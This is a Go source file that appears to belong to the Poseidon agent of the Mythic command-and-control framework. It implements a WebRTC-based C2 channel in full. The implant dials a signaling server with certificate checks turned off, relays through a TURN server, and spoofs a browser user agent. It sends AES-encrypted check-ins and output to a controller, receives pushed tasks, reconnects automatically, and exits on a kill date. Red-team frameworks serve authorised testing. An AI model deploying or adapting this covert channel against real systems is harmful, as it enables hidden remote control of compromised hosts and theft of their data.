//go:build (linux || darwin) && webrtc

package profiles

import (
	"crypto/rsa"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/responses"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils"

	// 3rd Party
	"github.com/gorilla/websocket"
	"github.com/pion/sdp/v3"
	"github.com/pion/webrtc/v4"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/crypto"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// WebRTC C2 profile variables from webrtc.py
// base64 encoded version of the JSON initial configuration of WebRTC
var webrtc_initial_config string

type WebRTCInitialConfig struct {
	SignalingServer        string `json:"signaling_server"`
	AuthKey                string `json:"auth_key"`
	TurnServer             string `json:"turn_server"`
	TurnUsername           string `json:"turn_username"`
	TurnPassword           string `json:"turn_password"`
	CallbackInterval       uint   `json:"callback_interval"`
	CallbackJitter         uint   `json:"callback_jitter"`
	EncryptedExchangeCheck bool   `json:"encrypted_exchange_check"`
	AESPSK                 string `json:"AESPSK"`
	Endpoint               string `json:"ENDPOINT_REPLACE"`
	Killdate               string `json:"killdate"`
	TaskingType            string `json:"tasking_type"`
	UserAgent              string `json:"USER_AGENT"`
}

const TaskingTypePush = "Push"
const TaskingTypePoll = "Poll"

// SignalMessage structure for WebSocket signaling - matches server
type SignalMessage struct {
	Type        string                 `json:"type"`        // "offer", "answer", "candidate", "connected" or "agent_info"
	Destination string                 `json:"destination"` // "offer" or "answer"
	SDP         sdp.SessionDescription `json:"sdp,omitempty"`
	Candidate   string                 `json:"candidate,omitempty"`
	AuthKey     string                 `json:"authKey"`
	AgentUUID   string                 `json:"agentUUID,omitempty"` // Agent UUID for identification
	Data        string                 `json:"data,omitempty"`      // Base64 encoded data payload
}

// Message structure for data channel communication - matches server
type Message struct {
	Data string `json:"data"`
}

type C2WebRTC struct {
	SignalingServer       string `json:"SignalingServer"`
	AuthKey               string `json:"AuthKey"`
	TurnServer            string `json:"TurnServer"`
	TurnUsername          string `json:"TurnUsername"`
	TurnPassword          string `json:"TurnPassword"`
	Interval              int    `json:"Interval"`
	Jitter                int    `json:"Jitter"`
	ExchangingKeys        bool   `json:"-"`
	UserAgent             string `json:"UserAgent"`
	Key                   string `json:"EncryptionKey"`
	RsaPrivateKey         *rsa.PrivateKey
	SignalingConn         *websocket.Conn        `json:"-"`
	DataChannel           *webrtc.DataChannel    `json:"-"`
	PeerConnection        *webrtc.PeerConnection `json:"-"`
	Lock                  sync.RWMutex           `json:"-"`
	ReconnectLock         sync.RWMutex           `json:"-"`
	Endpoint              string                 `json:"WebRTC Endpoint"`
	TaskingType           string                 `json:"TaskingType"`
	Killdate              time.Time              `json:"KillDate"`
	FinishedStaging       bool
	ShouldStop            bool
	stoppedChannel        chan bool
	PushChannel           chan structs.MythicMessage `json:"-"`
	interruptSleepChannel chan bool
	waitingForResponse    bool
	responseChannel       chan []byte
	responseMutex         sync.RWMutex
}

var websocketDialer = websocket.Dialer{
	TLSClientConfig: &tls.Config{
		InsecureSkipVerify: true,
	},
}

// Initialize the WebRTC C2 profile
func init() {
	initialConfigBytes, err := base64.StdEncoding.DecodeString(webrtc_initial_config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to decode initial webrtc config, exiting: %v\n", err))
		os.Exit(1)
	}
	initialConfig := WebRTCInitialConfig{}
	err = json.Unmarshal(initialConfigBytes, &initialConfig)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to unmarshal initial webrtc config, exiting: %v\n", err))
		os.Exit(1)
	}

	profile := C2WebRTC{
		SignalingServer:       initialConfig.SignalingServer,
		AuthKey:               initialConfig.AuthKey,
		TurnServer:            initialConfig.TurnServer,
		TurnUsername:          initialConfig.TurnUsername,
		TurnPassword:          initialConfig.TurnPassword,
		UserAgent:             initialConfig.UserAgent,
		Key:                   initialConfig.AESPSK,
		Endpoint:              initialConfig.Endpoint,
		ShouldStop:            true,
		stoppedChannel:        make(chan bool, 1),
		PushChannel:           make(chan structs.MythicMessage, 100),
		interruptSleepChannel: make(chan bool, 1),
	}

	// Convert sleep from string to integer
	profile.Interval = int(initialConfig.CallbackInterval)
	if profile.Interval < 0 {
		profile.Interval = 0
	}

	// Convert jitter from string to integer
	profile.Jitter = int(initialConfig.CallbackJitter)
	if profile.Jitter < 0 {
		profile.Jitter = 0
	}

	profile.ExchangingKeys = initialConfig.EncryptedExchangeCheck

	if len(profile.UserAgent) <= 0 {
		profile.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
	}

	// Force Push mode for WebRTC - remove Poll support
	profile.TaskingType = TaskingTypePush

	killDateString := fmt.Sprintf("%sT00:00:00.000Z", initialConfig.Killdate)
	killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
	if err != nil {
		os.Exit(1)
	}
	profile.Killdate = killDateTime

	RegisterAvailableC2Profile(&profile)
	go profile.CreateMessagesForEgressConnections()
}

func (c *C2WebRTC) Sleep() {
	// In push mode, sleep is not used for tasking intervals
	if c.TaskingType == TaskingTypePush {
		return
	}
	// wait for either sleep time duration or sleep interrupt
	select {
	case <-c.interruptSleepChannel:
	case <-time.After(time.Second * time.Duration(c.GetSleepTime())):
	}
}

func (c *C2WebRTC) CheckForKillDate() {
	for {
		if c.ShouldStop {
			return
		}
		time.Sleep(time.Duration(60) * time.Second)
		today := time.Now()
		if today.After(c.Killdate) {
			os.Exit(1)
		}
	}
}

func (c *C2WebRTC) IsP2P() bool {
	return false
}

func (c *C2WebRTC) IsRunning() bool {
	return !c.ShouldStop
}

func (c *C2WebRTC) setupWebRTC() bool {
	// Configure WebRTC with TURN server settings - use ICETransportPolicyRelay like server
	utils.PrintDebug(fmt.Sprintf("Setting up WebRTC with TURN Server: %s", c.TurnServer))
	utils.PrintDebug(fmt.Sprintf("TURN Username: %s, Password length: %d", c.TurnUsername, len(c.TurnPassword)))

	config := webrtc.Configuration{
		ICEServers: []webrtc.ICEServer{
			{
				URLs:       []string{c.TurnServer},
				Username:   c.TurnUsername,
				Credential: c.TurnPassword,
			},
		},
		ICETransportPolicy: webrtc.ICETransportPolicyRelay, // Match server config
	}

	// Create a new PeerConnection
	var err error
	c.PeerConnection, err = webrtc.NewPeerConnection(config)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to create peer connection: %v", err))
		return false
	}

	// More explicit data channel config for reliability
	dataChannelConfig := &webrtc.DataChannelInit{
		Ordered:        new(bool),
		Protocol:       new(string),
		Negotiated:     new(bool),
		MaxRetransmits: new(uint16),
	}
	*dataChannelConfig.Ordered = true
	*dataChannelConfig.Negotiated = false
	*dataChannelConfig.Protocol = "json"
	*dataChannelConfig.MaxRetransmits = 5

	utils.PrintDebug("Creating data channel with explicit configuration")
	dataChannel, err := c.PeerConnection.CreateDataChannel("data", dataChannelConfig)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to create data channel: %v", err))
		return false
	}

	// Set up data channel handlers
	dataChannel.OnOpen(func() {
		utils.PrintDebug(fmt.Sprintf("Data channel opened, state: %s", dataChannel.ReadyState().String()))
		c.Lock.Lock()
		c.DataChannel = dataChannel
		c.Lock.Unlock()
		utils.PrintDebug("WebRTC data channel is ready for communication")
	})

	dataChannel.OnMessage(func(msg webrtc.DataChannelMessage) {
		utils.PrintDebug(fmt.Sprintf("=== DATA CHANNEL MESSAGE RECEIVED ==="))
		utils.PrintDebug(fmt.Sprintf("Message length: %d", len(msg.Data)))
		utils.PrintDebug(fmt.Sprintf("Message content: %s", string(msg.Data)))

		// Process like the websocket client does
		c.processMessage(msg.Data)
	})

	// Log state changes for connection tracking
	c.PeerConnection.OnConnectionStateChange(func(state webrtc.PeerConnectionState) {
		utils.PrintDebug(fmt.Sprintf("Peer connection state changed: %s", state))
	})

	// Set up ICE connection state handling
	c.PeerConnection.OnICEConnectionStateChange(func(state webrtc.ICEConnectionState) {
		utils.PrintDebug(fmt.Sprintf("ICE connection state changed: %s", state.String()))
		if state == webrtc.ICEConnectionStateConnected {
			utils.PrintDebug("ICE connection established - ensure your data channel is ready")
		} else if state == webrtc.ICEConnectionStateDisconnected ||
			state == webrtc.ICEConnectionStateFailed ||
			state == webrtc.ICEConnectionStateClosed {
			// Connection lost, attempt to reconnect
			utils.PrintDebug("WebRTC connection lost, attempting to reconnect")
			if !c.ShouldStop {
				go c.reconnect()
			}
		}
	})

	// Handle incoming data channels as well (server might create one)
	c.PeerConnection.OnDataChannel(func(d *webrtc.DataChannel) {
		utils.PrintDebug(fmt.Sprintf("Received data channel from server: %s", d.Label()))

		// Handle this incoming data channel
		d.OnOpen(func() {
			utils.PrintDebug(fmt.Sprintf("Incoming data channel opened: %s", d.Label()))

			c.Lock.Lock()
			// Only set if we don't already have one
			if c.DataChannel == nil {
				c.DataChannel = d
				utils.PrintDebug("Set incoming data channel as active data channel")
			} else {
				utils.PrintDebug("Already have a data channel, not replacing")
			}
			c.Lock.Unlock()
		})

		// Set up message handler
		d.OnMessage(func(msg webrtc.DataChannelMessage) {
			utils.PrintDebug(fmt.Sprintf("=== INCOMING DATA CHANNEL MESSAGE RECEIVED ==="))
			utils.PrintDebug(fmt.Sprintf("Message length: %d", len(msg.Data)))
			utils.PrintDebug(fmt.Sprintf("Message content: %s", string(msg.Data)))

			// Process the message
			c.processMessage(msg.Data)
		})
	})

	return true
}

func (c *C2WebRTC) Start() {
	// only try to start if we're in a stopped state
	if !c.ShouldStop {
		return
	}
	c.ShouldStop = false

	// WebRTC only supports Push mode now
	go c.CheckForKillDate()

	defer func() {
		if c.SignalingConn != nil {
			c.SignalingConn.Close()
			c.SignalingConn = nil
		}
		if c.PeerConnection != nil {
			c.PeerConnection.Close()
			c.PeerConnection = nil
		}
		c.stoppedChannel <- true
	}()

	// Connect to signaling server and establish WebRTC connection
	if !c.connectSignaling() {
		utils.PrintDebug("Failed to connect to signaling server")
		return
	}
	// Create a WebRTC connection
	if !c.setupWebRTC() {
		utils.PrintDebug("Failed to set up WebRTC")
		return
	}
	// Exchange SDP information
	if !c.exchangeSDP() {
		utils.PrintDebug("Failed to exchange SDP")
		return
	}

	// Wait for data channel to be ready before proceeding (for push mode too)
	utils.PrintDebug("Waiting for WebRTC data channel to be ready...")
	timeout := time.After(30 * time.Second)
	for {
		c.Lock.RLock()
		dataChannel := c.DataChannel
		c.Lock.RUnlock()

		if dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen {
			utils.PrintDebug("Data channel is ready, now closing signaling WebSocket")

			// Close the WebSocket connection gracefully now that data channel is ready
			if c.SignalingConn != nil {
				utils.PrintDebug("Closing signaling WebSocket connection")
				c.SignalingConn.Close()
				c.SignalingConn = nil
			}

			utils.PrintDebug("WebSocket closed, data channel ready for push mode")
			break
		}
		select {
		case <-timeout:
			utils.PrintDebug("Timeout waiting for data channel to open")
			return
		case <-time.After(100 * time.Millisecond):
			// Continue waiting
		}
	}

	// Start processing incoming data from the data channel
	c.startDataChannelListener()
}

func (c *C2WebRTC) Stop() {
	if c.ShouldStop {
		return
	}
	c.ShouldStop = true

	// Close connections
	if c.SignalingConn != nil {
		c.SignalingConn.Close()
		c.SignalingConn = nil
	}

	if c.PeerConnection != nil {
		c.PeerConnection.Close()
		c.PeerConnection = nil
	}

	utils.PrintDebug("Issued stop to WebRTC")
	<-c.stoppedChannel
	utils.PrintDebug("WebRTC fully stopped")
}

func (c *C2WebRTC) UpdateConfig(parameter string, value string) {
	changingConnectionParameter := false

	switch parameter {
	case "SignalingServer":
		c.SignalingServer = value
		changingConnectionParameter = true
	case "AuthKey":
		c.AuthKey = value
		changingConnectionParameter = true
	case "TurnServer":
		c.TurnServer = value
		changingConnectionParameter = true
	case "TurnUsername":
		c.TurnUsername = value
		changingConnectionParameter = true
	case "TurnPassword":
		c.TurnPassword = value
		changingConnectionParameter = true
	case "Interval":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Interval = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "Jitter":
		newInt, err := strconv.Atoi(value)
		if err == nil {
			c.Jitter = newInt
		}
		go func() {
			c.interruptSleepChannel <- true
		}()
	case "UserAgent":
		c.UserAgent = value
		changingConnectionParameter = true
	case "EncryptionKey":
		c.Key = value
		SetAllEncryptionKeys(c.Key)
	case "Endpoint":
		c.Endpoint = value
	case "Killdate":
		killDateString := fmt.Sprintf("%sT00:00:00.000Z", value)
		killDateTime, err := time.Parse("2006-01-02T15:04:05.000Z", killDateString)
		if err == nil {
			c.Killdate = killDateTime
		}
	case "TaskingType":
		// WebRTC only supports Push mode
		c.TaskingType = TaskingTypePush
	}

	if changingConnectionParameter {
		// disconnect and reconnect for the new connection parameter values
		c.Stop()
		go c.Start()
	}
}

func (c *C2WebRTC) GetPushChannel() chan structs.MythicMessage {
	if !c.ShouldStop {
		return c.PushChannel
	}
	return nil
}

// CreateMessagesForEgressConnections is responsible for checking if we have messages to send
// and sends them out to Mythic
func (c *C2WebRTC) CreateMessagesForEgressConnections() {
	// got a message that needs to go to one of the c.ExternalConnection
	for {
		msg := <-c.PushChannel
		raw, err := json.Marshal(msg)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to marshal message to Mythic: %v\n", err))
			continue
		}
		utils.PrintDebug(fmt.Sprintf("Sending message outbound to WebRTC: %v\n", msg))
		c.SendMessage(raw)
	}
}

func (c *C2WebRTC) GetSleepTime() int {
	if c.ShouldStop {
		return -1
	}
	// Push mode doesn't use sleep intervals for tasking
	return 0
}

func (c *C2WebRTC) GetSleepInterval() int {
	return c.Interval
}

func (c *C2WebRTC) GetSleepJitter() int {
	return c.Jitter
}

func (c *C2WebRTC) GetKillDate() time.Time {
	return c.Killdate
}

func (c *C2WebRTC) SetSleepInterval(interval int) string {
	return fmt.Sprintf("Sleep interval not used for Push style C2 Profile\n")
}

func (c *C2WebRTC) SetSleepJitter(jitter int) string {
	return fmt.Sprintf("Jitter interval not used for Push style C2 Profile\n")
}

func (c *C2WebRTC) ProfileName() string {
	return "webrtc"
}

func (c *C2WebRTC) GetConfig() string {
	jsonString, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return fmt.Sprintf("Failed to get config: %v\n", err)
	}
	return string(jsonString)
}

func (c *C2WebRTC) CheckIn() structs.CheckInMessageResponse {
	checkin := CreateCheckinMessage()
	checkinMsg, err := json.Marshal(checkin)
	utils.PrintDebug(fmt.Sprintf("Checkin message: %v\n", checkin))
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("error trying to marshal checkin data\n"))
	}

	for {
		if c.ShouldStop {
			utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in checkin\n"))
			return structs.CheckInMessageResponse{}
		}

		if c.ExchangingKeys {
			utils.PrintDebug("Negotiating encryption key")
			for !c.NegotiateKey() {
				utils.PrintDebug(fmt.Sprintf("failed to negotiate key, trying again\n"))
				if c.ShouldStop {
					utils.PrintDebug(fmt.Sprintf("got c.ShouldStop while negotiateKey\n"))
					return structs.CheckInMessageResponse{}
				}
			}
		}

		utils.PrintDebug(fmt.Sprintf("Checkin msg:  %v \n", checkinMsg))

		// Send checkin message
		c.SendMessage(checkinMsg)

		// In push mode, the response comes asynchronously through the data channel
		// Just return success and let the async response handler deal with it
		utils.PrintDebug("Push mode: Checkin sent, response will come asynchronously")
		return structs.CheckInMessageResponse{
			Status: "success",
			ID:     "pending", // Will be updated when async response arrives
		}
	}
}

// SendMessage sends a message to Mythic via WebRTC
func (c *C2WebRTC) SendMessage(output []byte) []byte {
	if c.ShouldStop {
		utils.PrintDebug(fmt.Sprintf("got c.ShouldStop in sendMessage\n"))
		return nil
	}

	c.Lock.Lock()
	defer c.Lock.Unlock()

	// Encrypt the message if we have a key
	if len(c.Key) != 0 {
		output = c.encryptMessage(output)
	}

	// Add the agent UUID
	if GetMythicID() != "" {
		output = append([]byte(GetMythicID()), output...) // Prepend the UUID
	} else {
		output = append([]byte(UUID), output...) // Prepend the UUID
	}

	// Create a Message wrapper that matches the server's Message struct
	message := Message{
		Data: base64.StdEncoding.EncodeToString(output),
	}
	utils.PrintDebug(fmt.Sprintf("SendMessage - Showing base64 encoded message: %v\n", message))

	messageBytes, err := json.Marshal(message)

	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error marshaling WebRTC message: %v", err))
		return nil
	}

	// Push mode just sends the message, doesn't expect a response
	if c.DataChannel == nil {
		utils.PrintDebug("Data channel not established, can't send message")
		return nil
	}
	err = c.DataChannel.Send(messageBytes)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error sending WebRTC message: %v", err))
		go c.reconnect()
	}
	return nil
}

func (c *C2WebRTC) NegotiateKey() bool {
	sessionID := utils.GenerateSessionID()
	pub, priv := crypto.GenerateRSAKeyPair()
	c.RsaPrivateKey = priv

	initMessage := structs.EkeKeyExchangeMessage{}
	initMessage.Action = "staging_rsa"
	initMessage.SessionID = sessionID
	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)

	// Encode the json message
	raw, err := json.Marshal(initMessage)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error marshaling data: %s", err.Error()))
		return false
	}

	c.SendMessage(raw)
	// In push mode, return true and let async response handle the rest
	return true
}

// Connect to the signaling server
func (c *C2WebRTC) connectSignaling() bool {
	header := make(http.Header)
	header.Set("User-Agent", c.UserAgent)

	// Always set Push header since WebRTC only supports Push mode
	header.Set("Accept-Type", "Push")
	utils.PrintDebug("Using header Accept-Type: Push")

	// Connect to the signaling server (no need to add type=offer, client always connects as offer)
	signalingURL := c.SignalingServer

	// Connect to the signaling server
	var err error
	c.SignalingConn, _, err = websocketDialer.Dial(signalingURL, header)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Error connecting to signaling server: %v", err))
		return false
	}

	utils.PrintDebug("Connected to signaling server")
	return true
}

// Exchange SDP and ICE candidates with the server
func (c *C2WebRTC) exchangeSDP() bool {
	utils.PrintDebug("Setting up WebRTC")

	// Create offer
	offer, err := c.PeerConnection.CreateOffer(nil)
	if err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to create offer: %v", err))
		return false
	}

	utils.PrintDebug(fmt.Sprintf("Created offer successfully, SDP type: %v", offer.Type))

	// Set local description
	if err = c.PeerConnection.SetLocalDescription(offer); err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to set local description: %v", err))
		return false
	}

	// *** IMPORTANT: Create channels BEFORE sending the offer ***
	// Create channels for SDP and ICE candidates
	sdpChan := make(chan webrtc.SessionDescription, 1)
	candidateChan := make(chan webrtc.ICECandidateInit, 10)
	doneChan := make(chan bool, 1)

	// Set up ICE candidate handler before sending the offer
	c.PeerConnection.OnICECandidate(func(candidate *webrtc.ICECandidate) {
		if candidate == nil {
			utils.PrintDebug("Received nil ICE candidate, not sending")
			return
		}

		// Send the candidate to the signaling server
		candidateJSON := candidate.ToJSON()
		candidateStr := candidateJSON.Candidate

		utils.PrintDebug(fmt.Sprintf("Generated ICE candidate: %s", candidateStr))

		if candidateStr == "" {
			utils.PrintDebug("WARNING: Empty candidate string generated")
			return
		}

		signalMessage := SignalMessage{
			Type:        "candidate",
			Destination: "answer",
			Candidate:   candidateStr,
			AuthKey:     c.AuthKey,
			AgentUUID:   GetMythicID(),
		}

		// Check if signaling connection is still active
		if c.SignalingConn == nil {
			utils.PrintDebug("SignalingConn is nil, can't send ICE candidate")
			return
		}

		utils.PrintDebug(fmt.Sprintf("Sending ICE candidate: %s", candidateStr))
		err := c.SignalingConn.WriteJSON(signalMessage)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to send ICE candidate: %v", err))
		} else {
			utils.PrintDebug("Successfully sent ICE candidate")
		}
	})

	// Convert webrtc.SessionDescription to sdp.SessionDescription for sending
	var offerSDP sdp.SessionDescription
	if err := offerSDP.Unmarshal([]byte(offer.SDP)); err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to parse offer SDP: %v", err))
		return false
	}

	// Prepare offer message
	offerMessage := SignalMessage{
		Type:        "offer",
		Destination: "answer",
		SDP:         offerSDP,
		AuthKey:     c.AuthKey,
		AgentUUID:   GetMythicID(),
	}

	// Debug logging
	debugMsg := offerMessage
	sdpBytes, _ := debugMsg.SDP.Marshal()
	if len(sdpBytes) > 100 {
		var truncatedSDP sdp.SessionDescription
		truncatedSDP.Unmarshal(sdpBytes[:100])
		debugMsg.SDP = truncatedSDP
		utils.PrintDebug(fmt.Sprintf("Sending offer message: %+v... (SDP truncated)", debugMsg))
	} else {
		utils.PrintDebug(fmt.Sprintf("Sending offer message: %+v", debugMsg))
	}

	// Send the actual message
	utils.PrintDebug(fmt.Sprintf("Sending offer message (full message): %+v", offerMessage))
	if err := c.SignalingConn.WriteJSON(offerMessage); err != nil {
		utils.PrintDebug(fmt.Sprintf("Failed to send offer: %v", err))
		return false
	}

	utils.PrintDebug("Offer sent successfully, waiting for response...")

	// Start a goroutine to handle signaling messages
	go func() {
		// Add panic recovery
		defer func() {
			if r := recover(); r != nil {
				utils.PrintDebug(fmt.Sprintf("Recovered from panic in signaling handler: %v", r))
				doneChan <- false
			}
		}()

		for {
			// Check if connection is still valid
			if c.SignalingConn == nil {
				utils.PrintDebug("SignalingConn is nil, exiting signaling handler")
				doneChan <- false
				return
			}

			// Read a message from the signaling server
			var msg SignalMessage

			err := c.SignalingConn.ReadJSON(&msg)
			if err != nil {
				// Check if this is just a closed connection (expected when we close signaling)
				if strings.Contains(err.Error(), "use of closed network connection") ||
					strings.Contains(err.Error(), "websocket: close") {
					utils.PrintDebug("Signaling connection closed (expected)")
					return // Exit gracefully, don't report as error
				}

				utils.PrintDebug(fmt.Sprintf("Error reading from signaling server: %v", err))
				// Try to read any error messages that might have been sent
				var errorMsg SignalMessage
				if c.SignalingConn != nil {
					if errRead := c.SignalingConn.ReadJSON(&errorMsg); errRead == nil && errorMsg.Type == "error" {
						utils.PrintDebug(fmt.Sprintf("Server sent error: %s", errorMsg.Data))
					}
				}
				doneChan <- false
				return
			}

			// Process the message
			switch msg.Type {
			case "answer":
				// Convert sdp.SessionDescription to webrtc.SessionDescription
				sdpBytes, err := msg.SDP.Marshal()
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("Failed to marshal answer SDP: %v", err))
					doneChan <- false
					return
				}

				sdp := webrtc.SessionDescription{
					Type: webrtc.SDPTypeAnswer,
					SDP:  string(sdpBytes),
				}

				// Send the SDP to the channel
				sdpChan <- sdp

			case "candidate":
				// Parse the ICE candidate
				if msg.Candidate == "" {
					utils.PrintDebug("Received empty ICE candidate from server, ignoring")
					continue
				}

				candidate := webrtc.ICECandidateInit{
					Candidate: msg.Candidate,
				}

				utils.PrintDebug(fmt.Sprintf("Received ICE candidate: %s", candidate.Candidate))

				// Send the candidate to the channel
				candidateChan <- candidate

			case "connected":
				// WebRTC connection is established
				utils.PrintDebug("Received 'connected' message from signaling server")
				doneChan <- true
				return

			case "error":
				// Server reported an error
				utils.PrintDebug(fmt.Sprintf("Server reported error: %s", msg.Data))
				doneChan <- false
				return
			}
		}
	}()

	// Wait for the answer SDP first
	select {
	case sdp := <-sdpChan:
		// Set the remote description
		utils.PrintDebug("Received SDP answer, setting remote description")
		err = c.PeerConnection.SetRemoteDescription(sdp)
		if err != nil {
			utils.PrintDebug(fmt.Sprintf("Failed to set remote description: %v", err))
			return false
		}
		utils.PrintDebug("Set remote description successfully")

	case <-time.After(5 * time.Second):
		utils.PrintDebug("Timeout waiting for SDP answer")
		return false
	}

	// Process ICE candidates and wait for data channel
	candidatesProcessed := 0
	timeout := time.After(8 * time.Second) // Reduced from 15 to 8 seconds
	dataChannelCheckInterval := time.NewTicker(200 * time.Millisecond)
	defer dataChannelCheckInterval.Stop()

	utils.PrintDebug("Processing ICE candidates and waiting for data channel...")

	for {
		select {
		case candidate := <-candidateChan:
			// Process ICE candidate
			utils.PrintDebug(fmt.Sprintf("Received ICE candidate: %s", candidate.Candidate))
			if c.PeerConnection != nil {
				err = c.PeerConnection.AddICECandidate(candidate)
				if err != nil {
					utils.PrintDebug(fmt.Sprintf("Failed to add ICE candidate: %v", err))
				} else {
					candidatesProcessed++
					utils.PrintDebug(fmt.Sprintf("Added ICE candidate (%d)", candidatesProcessed))
				}
			}

		case <-dataChannelCheckInterval.C:
			// Check if data channel is ready more frequently
			c.Lock.RLock()
			dataChannel := c.DataChannel
			c.Lock.RUnlock()

			if dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen {
				utils.PrintDebug("Data channel is ready! Sending 'connected' message")

				// Send connected message
				connectedMsg := SignalMessage{
					Type:        "connected",
					Destination: "answer",
					AuthKey:     c.AuthKey,
					AgentUUID:   GetMythicID(),
				}

				if c.SignalingConn != nil {
					err := c.SignalingConn.WriteJSON(connectedMsg)
					if err != nil {
						utils.PrintDebug(fmt.Sprintf("Failed to send connected message: %v", err))
					} else {
						utils.PrintDebug("Sent 'connected' message to server")
					}
				}
				return true
			}

		case success := <-doneChan:
			// Connection is established or failed via signaling
			return success

		case <-timeout:
			// Final timeout - check if we have a working data channel
			c.Lock.RLock()
			dataChannel := c.DataChannel
			c.Lock.RUnlock()

			if dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen {
				utils.PrintDebug("Data channel ready at timeout, proceeding")
				return true
			}

			if candidatesProcessed > 0 {
				utils.PrintDebug(fmt.Sprintf("Timeout but processed %d candidates, checking data channel one more time", candidatesProcessed))

				// One final check with a short wait
				time.Sleep(1 * time.Second)
				c.Lock.RLock()
				dataChannel := c.DataChannel
				c.Lock.RUnlock()

				if dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen {
					utils.PrintDebug("Data channel ready after final check")
					return true
				}
			}

			utils.PrintDebug("Timeout waiting for data channel to be ready")
			return false
		}
	}
}

// startDataChannelListener handles incoming messages in Push mode
func (c *C2WebRTC) startDataChannelListener() {
	defer func() {
		c.stoppedChannel <- true
	}()

	// Wait for data channel to be established
	for {
		c.Lock.RLock()
		dataChannel := c.DataChannel
		dataChannelReady := dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen
		c.Lock.RUnlock()

		if dataChannelReady {
			utils.PrintDebug("Data channel is ready for push mode")
			break
		}

		if c.ShouldStop {
			return
		}

		utils.PrintDebug("Waiting for data channel to be ready for push mode...")
		time.Sleep(500 * time.Millisecond)
	}

	// Now we have a data channel, proceed with checkin
	utils.PrintDebug("Data channel established, proceeding with push mode")

	// If we're exchanging keys, start the key exchange
	if c.ExchangingKeys {
		c.NegotiateKey()
	} else {
		c.CheckIn()
	}

	// In pure push mode, do NOT poll for missed messages
	// Just wait for tasks to be pushed from the server
	utils.PrintDebug("Push mode active - waiting for tasks to be pushed from server")

	// Main loop - just keep the agent running and listening
	// The actual message handling is done by the DataChannel.OnMessage callback
	for {
		if c.ShouldStop {
			c.closeConnections()
			return
		}

		// Check if the data channel is still open
		c.Lock.RLock()
		dataChannel := c.DataChannel
		c.Lock.RUnlock()

		if dataChannel == nil || dataChannel.ReadyState() != webrtc.DataChannelStateOpen {
			utils.PrintDebug("Data channel closed, reconnecting")
			go c.reconnect()
			return
		}

		// Sleep for a bit to avoid busy waiting
		time.Sleep(1 * time.Second)
	}
}

func (c *C2WebRTC) reconnect() {
	if c.ShouldStop {
		utils.PrintDebug("Got c.ShouldStop in reconnect")
		return
	}

	c.ReconnectLock.Lock()
	defer c.ReconnectLock.Unlock()

	// Close existing connections
	if c.SignalingConn != nil {
		c.SignalingConn.Close()
		c.SignalingConn = nil
	}

	if c.PeerConnection != nil {
		c.PeerConnection.Close()
		c.PeerConnection = nil
	}

	c.Lock.Lock()
	c.DataChannel = nil
	c.Lock.Unlock()

	utils.PrintDebug("Reconnecting to signaling server")

	// Try to reconnect
	for i := 0; i < 5; i++ {
		if c.ShouldStop {
			return
		}

		// Connect to signaling server
		if !c.connectSignaling() {
			utils.PrintDebug("Failed to connect to signaling server, retrying")
			time.Sleep(time.Duration(2*(i+1)) * time.Second)
			continue
		}

		// Create a WebRTC connection
		if !c.setupWebRTC() {
			utils.PrintDebug("Failed to set up WebRTC, retrying")
			time.Sleep(time.Duration(2*(i+1)) * time.Second)
			continue
		}

		// Exchange SDP information
		if !c.exchangeSDP() {
			utils.PrintDebug("Failed to exchange SDP, retrying")
			time.Sleep(time.Duration(2*(i+1)) * time.Second)
			continue
		}

		utils.PrintDebug("Reconnected successfully")

		// Wait for the data channel to be ready
		for {
			c.Lock.RLock()
			dataChannel := c.DataChannel
			c.Lock.RUnlock()

			if dataChannel != nil {
				break
			}
			if c.ShouldStop {
				return
			}
			time.Sleep(100 * time.Millisecond)
		}

		// In push mode, don't send any polling messages during reconnect
		// Just re-establish the connection and wait for pushed tasks
		utils.PrintDebug("Reconnected in push mode - ready to receive pushed tasks")

		return
	}

	utils.PrintDebug("Failed to reconnect after multiple attempts")
}

func (c *C2WebRTC) closeConnections() {
	if c.SignalingConn != nil {
		c.SignalingConn.Close()
		c.SignalingConn = nil
	}

	if c.PeerConnection != nil {
		c.PeerConnection.Close()
		c.PeerConnection = nil
	}

	c.Lock.Lock()
	c.DataChannel = nil
	c.Lock.Unlock()
}

func (c *C2WebRTC) encryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesEncrypt(key, msg)
}

func (c *C2WebRTC) decryptMessage(msg []byte) []byte {
	key, _ := base64.StdEncoding.DecodeString(c.Key)
	return crypto.AesDecrypt(key, msg)
}

